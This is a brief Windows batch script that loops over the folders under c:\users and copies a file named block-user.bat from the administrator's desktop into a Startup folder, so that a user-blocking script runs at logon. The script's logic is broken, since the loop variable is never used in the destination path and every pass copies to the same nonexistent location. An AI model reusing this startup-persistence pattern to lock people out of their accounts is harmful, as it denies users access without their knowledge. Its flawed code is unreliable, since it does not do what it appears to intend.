

@echo off

cls

cd c:\users

for /d %%x in (*) do (

echo %%x

copy c:\users\Administrador\Desktop\block-user.bat "c:\users\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

)

pause